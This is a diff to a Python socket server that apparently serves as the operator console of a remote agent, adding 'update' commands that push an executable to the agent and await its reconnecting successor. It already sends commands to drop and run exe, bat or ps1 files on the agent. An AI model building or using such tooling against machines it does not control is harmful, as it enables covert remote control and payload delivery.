@@ -19,6 +19,9 @@ HELP_TEXT = """Commands:
   event:<name>               Fire a plugin event
   execute:<ext>:<path>       Drop and run a file on the agent
                              ext: exe | bat | ps1
+  update:<path>              Install an executable using its filename
+  update-as:<filename>:<path>
+                             Install the file under an explicit filename
   <path>                     Shorthand for load:<path>"""
 
 def read_line(s):
@@ -48,6 +51,8 @@ def wait_result(s):
         if line == "HB":
             s.sendall(b"PONG\n")
             continue
+        if line.startswith("ACK:UPDATE:"):
+            return line
         print(line)
         if line.startswith("ACK:") or line.startswith("ERR:"):
             return line
@@ -59,11 +64,27 @@ def plugin_cmd(path):
     b64 = base64.b64encode(data).decode()
     return f"CMD:PLUGIN:{stem}:{b64}"
 
+def update_cmd(filename, path):
+    with open(path, "rb") as f:
+        data = f.read()
+    b64 = base64.b64encode(data).decode()
+    return f"CMD:UPDATE:{filename}:{b64}"
+
 def execute_cmd(ext, path):
     with open(path, "rb") as f:
         data = f.read()
     b64 = base64.b64encode(data).decode()
     return f"CMD:EXECUTE:{ext.lower()}:{b64}"
+
+def accept_agent(server):
+    conn, addr = server.accept()
+    print(f"connected {addr[0]}")
+    hello = read_line(conn)
+    data = read_line(conn)
+    print(hello)
+    show(data)
+    return conn
+
 
 def main():
     ap = argparse.ArgumentParser()
@@ -74,18 +95,13 @@ def main():
 
     with socket.create_server((a.ip, a.port)) as server:
         print(f"listening {a.ip}:{a.port}")
-        conn, addr = server.accept()
+        conn = accept_agent(server)
         with conn:
-            print(f"connected {addr[0]}")
-            hello = read_line(conn)
-            data = read_line(conn)
-            print(hello)
-            show(data)
             if a.test:
                 stem = os.path.splitext(os.path.basename(a.test))[0]
                 cmds = [
                     plugin_cmd(a.test),
-                    f"CMD:PLUGIN_EVENT:ping",
+                    "CMD:PLUGIN_EVENT:ping",
                     f"CMD:UNLOAD:{stem}",
                     "CMD:CLOSE",
                 ]
@@ -135,14 +151,44 @@ def main():
                     except OSError as e:
                         print(f"error: {e}")
                         continue
+                elif lc.startswith("update-as:"):
+                    rest = cmd.split(":", 2)
+                    if len(rest) < 3:
+                        print("usage: update-as:<filename>:<path>")
+                        continue
+                    filename, path = rest[1].strip(), rest[2].strip()
+                    try:
+                        conn.sendall((update_cmd(filename, path) + "\n").encode())
+                    except OSError as e:
+                        print(f"error: {e}")
+                        continue
+                elif lc.startswith("update:"):
+                    path = cmd.split(":", 1)[1].strip()
+                    if not path:
+                        print("usage: update:<path>")
+                        continue
+                    filename = os.path.basename(path)
+                    try:
+                        conn.sendall((update_cmd(filename, path) + "\n").encode())
+                    except OSError as e:
+                        print(f"error: {e}")
+                        continue
                 else:
                     try:
                         conn.sendall((plugin_cmd(cmd) + "\n").encode())
                     except OSError as e:
                         print(f"error: {e}")
                         continue
-                if not wait_result(conn):
+                result = wait_result(conn)
+                if not result:
                     return
+                if lc.startswith("update:") or lc.startswith("update-as:"):
+                    if result.startswith("ACK:UPDATE:"):
+                        print("update handoff accepted; waiting for successor")
+                        conn.close()
+                        conn = accept_agent(server)
+                        print("update restored")
+                        continue
                 if lc in {"close", "exit", "quit"}:
                     return
 
